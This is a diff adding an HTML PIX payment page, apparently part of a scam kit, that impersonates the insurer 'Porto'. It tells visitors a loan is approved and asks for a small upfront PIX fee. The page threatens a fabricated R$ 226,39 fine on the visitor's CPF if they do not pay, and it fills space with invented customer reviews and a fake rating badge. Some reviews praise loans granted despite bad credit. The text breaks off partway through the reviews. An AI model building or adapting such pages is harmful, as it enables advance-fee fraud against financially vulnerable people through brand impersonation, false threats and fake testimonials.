@@ -1,0 +1,802 @@
+﻿<!DOCTYPE html><html lang="pt-BR">
+<head>
+<script src="../../js/utm.js"></script>
+<script src="../../js/tracking.js"></script>
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async="" defer=""></script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="robots" content="noindex,nofollow">
+  <!-- Gerador de QR local (self-hosted, sem depender de serviço externo) -->
+  <script src="../../js/qrcode.js"></script>
+  <title>Pagamento via PIX — Porto</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&amp;family=Outfit:wght@500;600;700;800&amp;family=JetBrains+Mono:wght@400;600&amp;display=swap" rel="stylesheet">
+  <script src="../../../fluxo.js"></script>
+  <style>
+    :root{
+      --primary:#0099FF; --primary-deep:#0A0047; --primary-accent:#0099FF; --primary-soft:#fef0e4; --primary-border:#fde0c8;
+      --green:#22c55e; --green-dark:#16a34a; --green-soft:#f0fdf4;
+      --text:#333333; --text-mid:#374151; --text-light:#6B7280; --muted:#94A3B8;
+      --border:#E5E7EB; --bg:#F4F5F7;
+      font-family:'DM Sans',sans-serif;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+    body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--text);-webkit-font-smoothing:antialiased;min-height:100vh;}
+    .container{width:100%;max-width:460px;margin:0 auto;background:#F0F8FF; min-height:100vh;box-shadow:0 0 40px rgba(0,0,0,.05);}
+    @keyframes spin{to{transform:rotate(360deg);}}
+
+    /* HEADER */
+    .m2-header{background:#F0F8FF;border-bottom:3px solid #0099FF;padding:22px 24px 24px;position:relative;overflow:hidden;}
+    .m2-header::before{content:'';position:absolute;top:-40%;right:-20%;width:280px;height:280px;background:radial-gradient(circle,rgba(0,153,255,0.10) 0%,transparent 70%);pointer-events:none;}
+    .m2-header-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;}
+    .m2-brand{display:flex;align-items:center;}
+    .m2-brand img{height:38px;width:auto;max-width:160px;display:block;}
+    .m2-policy-label{font-size:10px;color:#0A0047;font-family:'JetBrains Mono',monospace;text-align:right;}
+    .m2-policy-num{font-size:15px;font-weight:800;color:#0A0047;text-align:right;}
+    .m2-info-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;background:#E6F4FF;border-radius:12px;padding:14px 16px;margin-bottom:18px;border:2px solid #0099FF;}
+    .m2-info-label{font-size:10px;color:#0A0047;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:4px;}
+    .m2-info-value{font-size:14px;font-weight:700;color:#0066CC;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+    .m2-header-hero{position:relative;z-index:1;}
+    .m2-header-hero .ha-badge{display:inline-flex;align-items:center;gap:8px;background:#0099FF;border:1px solid #0099FF;border-radius:20px;padding:6px 16px;margin-bottom:14px;}
+    .m2-header-hero .ha-badge svg{width:18px;height:18px;color:#FFFFFF;}
+    .m2-header-hero .ha-badge span{font-size:0.72rem;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;color:#FFFFFF;}
+    .m2-header-hero .ha-title{font-family:'Outfit',sans-serif;font-size:1.45rem;font-weight:800;color:#0099FF;line-height:1.25;letter-spacing:-0.3px;margin-bottom:10px;}
+    .m2-header-hero .ha-title .hl{color:#0A0047;}
+    .m2-header-hero .ha-sub{font-size:0.88rem;color:#0099FF;font-weight:500;line-height:1.5;}
+    .m2-header-hero .ha-sub strong{color:#0099FF;font-weight:700;}
+
+    /* CONTENT */
+    .m2-content{padding:24px 24px 30px;}
+    .m2-page-title{text-align:center;color:#0099FF;font-family:'Outfit',sans-serif;font-weight:800;font-size:20px;margin-bottom:18px;}
+    .m2-total-row{display:flex;justify-content:space-between;align-items:baseline;font-family:'Outfit',sans-serif;font-size:20px;font-weight:800;border-bottom:2px solid var(--primary);padding-bottom:14px;margin-bottom:20px;}
+    .m2-total-row span:last-child{color:var(--green);}
+
+    .m2-pix-label{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;font-size:13px;font-weight:700;color:var(--text-mid);}
+    .m2-pix-badge{background:var(--primary);color:#FFFFFF;font-size:11px;font-weight:800;padding:4px 12px;border-radius:6px;letter-spacing:.5px;}
+
+    /* CAIXA PIX */
+    .m2-pix-box{background:#F0F8FF; border:1.5px solid var(--border);border-radius:14px;padding:20px 18px;margin-bottom:20px;}
+    .m2-pix-box-header{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:6px;}
+    .m2-pix-box-label{font-size:14px;font-weight:600;color:var(--text-mid);}
+    .m2-pix-box-price{font-family:'Outfit',sans-serif;font-size:22px;font-weight:800;color:var(--text);}
+    .m2-pix-box-note{display:flex;align-items:center;gap:6px;font-size:12.5px;font-weight:600;color:var(--green-dark);margin-bottom:16px;}
+    .m2-pix-box-note svg{width:14px;height:14px;flex-shrink:0;}
+    .m2-btn-generate{width:100%;display:flex;align-items:center;justify-content:center;gap:10px;padding:16px;background:linear-gradient(90deg,var(--primary-accent),var(--primary));color:#FFFFFF;border:none;border-radius:12px;font-family:'DM Sans',sans-serif;font-weight:800;font-size:15px;cursor:pointer;transition:all .2s;box-shadow:0 4px 16px rgba(0,153,255,.3);}
+    .m2-btn-generate:hover{transform:translateY(-1px);}
+    .m2-btn-generate svg{width:20px;height:20px;}
+    .m2-pix-box-secure{display:flex;align-items:center;justify-content:center;gap:6px;font-size:11.5px;color:var(--text-light);margin-top:14px;line-height:1.5;text-align:center;}
+    .m2-pix-box-secure svg{width:12px;height:12px;flex-shrink:0;color:#0099FF;}
+
+    /* LOADING */
+    .m2-loading{text-align:center;padding:40px 0;min-height:320px;display:flex;flex-direction:column;align-items:center;justify-content:center;}
+    .m2-loading .spinner{width:42px;height:42px;border:3px solid var(--primary-border);border-top-color:var(--primary);border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 14px;}
+    .m2-loading-text{color:#0099FF;font-size:13px;font-weight:500;}
+
+    /* QR */
+    #qrContainer{display:none;text-align:center;}
+    .m2-qr-wrap{width:200px;height:200px;margin:0 auto 16px;border-radius:14px;background:#F0F8FF; border:2px solid var(--border);display:flex;align-items:center;justify-content:center;overflow:hidden;padding:8px;}
+    .m2-qr-wrap img{width:100%;height:100%;display:block;object-fit:contain;}
+    .m2-code-box{width:100%;padding:13px 14px;background:var(--primary-soft);border:1px solid var(--primary-border);border-radius:10px;margin-bottom:10px;}
+    .m2-code-text{display:block;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-mid);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;text-align:center;}
+    .m2-btn-copy{width:100%;display:flex;align-items:center;justify-content:center;gap:10px;padding:17px;background:linear-gradient(90deg,var(--primary-accent),var(--primary));color:#FFFFFF;border:none;border-radius:12px;font-family:'DM Sans',sans-serif;font-weight:800;font-size:16px;cursor:pointer;transition:all .2s;box-shadow:0 6px 20px rgba(0,153,255,.32);}
+    .m2-btn-copy:hover{transform:translateY(-1px);background:linear-gradient(90deg,#33B0FF,#0066CC);}
+    .m2-btn-copy.copied{background:var(--green);box-shadow:none;}
+    .m2-btn-copy svg{width:18px;height:18px;}
+
+    /* STATUS */
+    .m2-status-bar{display:flex;align-items:center;justify-content:center;gap:10px;padding:15px;background:var(--primary-soft);border-radius:12px;margin-top:16px;border:1px solid var(--primary-border);}
+    .m2-spinner{width:19px;height:19px;border:2.5px solid var(--primary-border);border-top-color:var(--primary);border-radius:50%;animation:spin .8s linear infinite;flex-shrink:0;}
+    .m2-status-text{font-size:14px;font-weight:600;color:var(--primary-deep);}
+    .m2-success{background:var(--green-soft);color:var(--green-dark);padding:16px;border-radius:12px;text-align:center;font-size:15px;font-weight:700;margin-top:16px;display:flex;align-items:center;justify-content:center;gap:8px;}
+    .m2-success svg{width:20px;height:20px;}
+    .m2-error{background:#FEE2E2;color:#991B1B;padding:16px;border-radius:12px;text-align:center;font-size:14px;font-weight:500;margin-top:16px;}
+    #timer{font-size:13px;color:var(--text-light);font-weight:600;text-align:center;margin-top:12px;}
+
+    /* COVERAGE */
+    .m2-section-label{font-size:10px;font-weight:700;color:#0099FF;letter-spacing:1.5px;text-transform:uppercase;margin:24px 0 12px;}
+    .m2-cover-item{display:flex;align-items:center;gap:12px;padding:10px 12px;margin-bottom:6px;background:var(--bg);border-radius:10px;}
+    .m2-cover-icon{width:32px;height:48px;border-radius:8px;background:var(--primary-soft);border:1px solid var(--primary-border);display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+    .m2-cover-icon svg{width:16px;height:16px;stroke:var(--primary);}
+    .m2-cover-text{font-size:13px;color:var(--text-mid);font-weight:600;}
+
+    /* SECURE + FOOTER */
+    .m2-secure{display:flex;align-items:center;justify-content:center;gap:8px;background:var(--green-soft);border:1px solid #bbf7d0;color:var(--green-dark);padding:11px;border-radius:10px;font-size:13px;font-weight:600;margin-top:18px;}
+    .m2-secure svg{width:15px;height:15px;}
+    .hidden{display:none !important;}
+
+    /* AVISO CANCELAMENTO */
+    .m2-cancel-warn{background:#FEF2F2;border:1px solid #FECACA;border-radius:10px;padding:12px 14px;margin-bottom:16px;display:flex;align-items:flex-start;gap:10px;}
+    .m2-cancel-svg{width:20px;height:20px;min-width:20px;color:#DC2626;margin-top:1px;}
+    .m2-cancel-text{font-size:12.5px;color:#991B1B;line-height:1.55;font-weight:500;}
+    .m2-cancel-text strong{font-weight:700;color:#7F1D1D;}
+
+    /* REVIEWS */
+    .m2-reviews{margin-top:22px;}
+    .m2-reviews-header{display:flex;align-items:center;gap:10px;margin-bottom:14px;}
+    .m2-reviews-logo{height:20px;width:auto;}
+    .m2-reviews-badge{display:flex;align-items:center;gap:4px;background:#0A0047;border-radius:6px;padding:4px 10px;}
+    .m2-reviews-badge span{font-size:11px;font-weight:800;color:#0099FF;}
+    .m2-reviews-badge .ra-score{color:#0099FF;font-size:13px;}
+    .m2-reviews-title{font-size:10px;font-weight:700;color:#0099FF;letter-spacing:1.5px;text-transform:uppercase;}
+    .m2-review{background:#F0F8FF; border:1px solid var(--border);border-radius:12px;padding:14px;margin-bottom:10px;}
+    .m2-review-top{display:flex;align-items:center;gap:10px;margin-bottom:8px;}
+    .m2-review-avatar{width:40px;height:40px;min-width:40px;border-radius:50%;object-fit:cover;}
+    .m2-review-name{font-size:13px;font-weight:700;color:var(--text);}
+    .m2-review-stars{display:flex;gap:2px;margin-top:2px;}
+    .m2-review-stars svg{width:12px;height:12px;fill:#0099FF;color:#0099FF;}
+    .m2-review-text{font-size:12.5px;color:var(--text-mid);line-height:1.55;font-weight:500;}
+
+    /* REVIEW BADGE */
+    .review-badge{display:flex;flex-direction:column;align-items:center;gap:4px;padding:16px 0 6px;margin-bottom:14px;}
+    .review-stars{display:flex;gap:3px;}
+    .review-stars svg{width:18px;height:18px;fill:#0099FF;color:#0099FF;}
+    .review-score{font-family:'Outfit',sans-serif;font-size:1.05rem;font-weight:800;color:var(--primary);}
+    .review-count{font-size:0.78rem;color:var(--text-light);font-weight:500;}
+
+/* =================== FOOTER Porto =================== */
+.ss-footer{background:#F0F8FF; border-top:1px solid #E5E7EB;padding:32px 20px 24px;text-align:center;font-family:"DM Sans",-apple-system,BlinkMacSystemFont,sans-serif;color:#6B7280;font-size:14px;line-height:1.6}
+.ss-footer-logo{margin-bottom:16px}
+.ss-footer-logo img{height:42px;width:auto;display:inline-block}
+.ss-footer-company{font-size:14px;font-weight:700;color:#0A0047;margin-bottom:4px}
+.ss-footer-addr{font-size:12px;color:#9CA3AF;margin-bottom:16px}
+.ss-footer-links{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-bottom:16px;padding-top:16px;border-top:1px solid #E5E7EB}
+.ss-footer-links a{color:#374151;text-decoration:none;font-size:12px;font-weight:500;cursor:pointer}
+.ss-footer-links a:hover{color:#0099FF}
+.ss-footer-links span{opacity:.4;font-size:12px}
+.ss-footer-badges{display:flex;align-items:center;justify-content:center;gap:16px;flex-wrap:wrap}
+.ss-footer-badges span{display:flex;align-items:center;gap:4px;font-size:11px;color:#6B7280;font-weight:500}
+.ss-footer-badges svg{width:14px;height:14px;color:#0A0047}
+.ss-dialog{border:0;padding:0;border-radius:20px;color:#374151;max-width:600px;width:calc(100% - 32px);box-shadow:0 20px 60px rgba(0,0,0,.2)}
+.ss-dialog::backdrop{background:rgba(0,0,0,.5);-webkit-backdrop-filter:blur(4px);backdrop-filter:blur(4px)}
+.ss-dialog-head{display:flex;justify-content:space-between;align-items:center;padding:24px 24px 20px;border-bottom:1px solid #E5E7EB}
+.ss-dialog-head h2{font-family:"DM Sans",sans-serif;font-size:20px;font-weight:700;margin:0}
+.ss-dialog-close{background:none;border:none;font-size:32px;color:#6B7280;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:50%;transition:all .2s;line-height:1;padding:0}
+.ss-dialog-close:hover{background:#F3F4F6;color:#374151}
+.ss-dialog-body{padding:24px;overflow-y:auto;max-height:70vh}
+.ss-dialog-body h3{font-size:17px;font-weight:700;color:#0A0047;margin:24px 0 12px}
+.ss-dialog-body h3:first-child{margin-top:0}
+.ss-dialog-body p{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:16px}
+.ss-dialog-body ul{margin:12px 0 16px 20px;padding:0}
+.ss-dialog-body li{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:8px}
+.ss-contact-item{display:flex;gap:16px;align-items:flex-start;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:16px;margin-bottom:12px}
+.ss-contact-icon{width:48px;height:48px;background:#0A0047;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ss-contact-icon svg{color:#0099FF;width:24px;height:24px}
+.ss-contact-item h4{font-size:15px;font-weight:700;color:#0A0047;margin:0 0 4px}
+.ss-contact-item p{font-size:14px;color:#6B7280;margin:0}
+.ss-contact-note{margin-top:16px;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:12px}
+.ss-contact-note p{font-size:13px;line-height:1.6;color:#374151;margin-bottom:8px}
+.ss-contact-note p:last-child{margin-bottom:0}
+.ss-contact-note strong{color:#0A0047}
+
+</style>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&amp;family=Hind+Siliguri:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+  <script src="../devnav.js"></script>
+</head>
+<body>
+  <div class="container">
+
+    <!-- HEADER -->
+    <div class="m2-header">
+      <div class="m2-header-top">
+        <div class="m2-brand">
+          <img src="../../images/logo.png" alt="Porto">
+        </div>
+        <div>
+          <div class="m2-policy-label">PROTOCOLO</div>
+          <div class="m2-policy-num" id="protocolNum">#SS-4015</div>
+        </div>
+      </div>
+      <div class="m2-info-grid">
+        <div><div class="m2-info-label">Segurado</div><div class="m2-info-value" id="leadNome">Cliente</div></div>
+        <div><div class="m2-info-label">CPF</div><div class="m2-info-value" id="leadCPF">***.***.***-**</div></div>
+      </div>
+      <div class="m2-header-hero">
+        <div class="ha-badge">
+          <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+          <span id="haBadgeText">Aprovado</span>
+        </div>
+        <h1 class="ha-title" id="haTitle">Seu empréstimo foi <span class="hl">aprovado com sucesso!</span></h1>
+        <p class="ha-sub" id="haSub">O valor já está reservado para <strong>liberação imediata</strong>. Finalize o pagamento abaixo para confirmar.</p>
+      </div>
+    </div>
+
+    <!-- CONTENT -->
+    <div class="m2-content">
+
+      <!-- AVISO CANCELAMENTO -->
+      <div class="m2-cancel-warn">
+        <svg class="m2-cancel-svg" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v4m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"></path></svg>
+        <div class="m2-cancel-text"><strong>Atenção:</strong> se o pagamento não for confirmado no prazo, o pedido será cancelado automaticamente e uma <strong>multa de R$ 226,39 será registrada no seu CPF</strong>.</div>
+      </div>
+
+      <div class="m2-total-row"><span>Total</span><span id="totalAmount">R$ 36,84</span></div>
+
+      <div class="m2-pix-label">Pagamento via PIX <span class="m2-pix-badge">PIX</span></div>
+
+      <div id="loading" class="m2-loading">
+        <div class="spinner"></div>
+        <div class="m2-loading-text">Gerando PIX...</div>
+      </div>
+
+      <div id="qrContainer" style="display:none;">
+        <div class="m2-qr-wrap"><img id="qrImage" src="#" alt="QR Code PIX"></div>
+        <div class="m2-code-box"><span class="m2-code-text" id="pixCodeDisplay"></span></div>
+        <input type="hidden" id="pixCode" value="">
+        <button class="m2-btn-copy" id="copyBtn" type="button">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"></path></svg>
+          <span id="copyBtnText">Copiar código PIX</span>
+        </button>
+      </div>
+
+      <div id="statusPending" class="m2-status-bar hidden">
+        <div class="m2-spinner"></div>
+        <span class="m2-status-text">Aguardando pagamento...</span>
+      </div>
+      <div id="statusSuccess" class="m2-success hidden">
+        <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg>
+        Pagamento confirmado!
+      </div>
+      <div id="statusError" class="m2-error hidden"><div style="margin-bottom: 10px;">Erro ao verificar pagamento</div><button type="button" onclick="location.reload()" style="background: var(--primary); color: rgb(255, 255, 255); border: none; border-radius: 8px; padding: 10px 22px; font-weight: 700; cursor: pointer; font-family: inherit;">Tentar novamente</button></div>
+      <div id="timer"></div>
+      <a id="btnRecusar" href="../final/" style="display:block;text-align:center;margin:14px 0 2px;font-size:13px;font-weight:600;color:#9CA3AF;text-decoration:underline;cursor:pointer;">Não quero esta oferta agora</a>
+
+      <div class="m2-section-label">Coberturas incluídas</div>
+            <div class="m2-cover-item"><div class="m2-cover-icon"><svg fill="none" stroke-width="1.8" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div><span class="m2-cover-text">Proteção contra morte e invalidez</span></div>
+            <div class="m2-cover-item"><div class="m2-cover-icon"><svg fill="none" stroke-width="1.8" viewBox="0 0 24 24"><path d="M3 12a9 9 0 1 0 2.6-6.4"></path><path d="M3 3v5h5"></path></svg></div><span class="m2-cover-text">100% reembolsável ao final do contrato</span></div>
+            <div class="m2-cover-item"><div class="m2-cover-icon"><svg fill="none" stroke-width="1.8" viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path></svg></div><span class="m2-cover-text">Liberação imediata após a confirmação</span></div>
+            <div class="m2-cover-item"><div class="m2-cover-icon"><svg fill="none" stroke-width="1.8" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"></path></svg></div><span class="m2-cover-text">Pagamento único</span></div>
+      
+      <div class="m2-secure">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+        Ambiente seguro e criptografado
+      </div>
+
+
+      <!-- REVIEW BADGE -->
+      <div class="review-badge">
+        <div class="review-stars">
+          <svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg>
+          <svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg>
+          <svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg>
+          <svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg>
+          <svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg>
+        </div>
+        <span class="review-score">4,9/5</span>
+        <span class="review-count">Mais de 120 mil clientes atendidos</span>
+      </div>
+
+      <!-- REVIEWS -->
+      <div class="m2-reviews">
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%237C3AED'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23E9D5FF'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23E9D5FF'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%23C4B5FD'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%23C4B5FD'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Caroline Medeiros</div>
+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">Eu achei que não ia receber o empréstimo, menos de 24 horas e caiu o valor certinho na minha conta, agora vou ficar mais tranquila.</div>
+        </div>
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%230891B2'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23A5F3FC'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23A5F3FC'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%2367E8F9'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%2367E8F9'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Daniela Rodrigues</div>
+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">O empréstimo caiu na hora, nem acreditei, vou poder dar entrada no meu carro agora.</div>
+        </div>
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%23D97706'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23FDE68A'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23FDE68A'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%23FCD34D'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%23FCD34D'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Geane Gonçalves</div>
+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20" style="fill:#D1D5DB;color:#D1D5DB;"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">Agora sim vou passar as férias de janeiro bem com minhas filhas, obrigada por liberarem o empréstimo mesmo com nome sujo.</div>
+        </div>
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%23059669'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23A7F3D0'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23A7F3D0'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%236EE7B7'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%236EE7B7'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Patrícia Almeida</div>
+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">Estava precisando muito e achei que ia demorar semanas. Fiz a solicitação de noite e no outro dia já tinha o dinheiro na conta. Super recomendo!</div>
+        </div>
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%23DC2626'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23FECACA'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23FECACA'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%23FCA5A5'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%23FCA5A5'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Renata Oliveira</div>
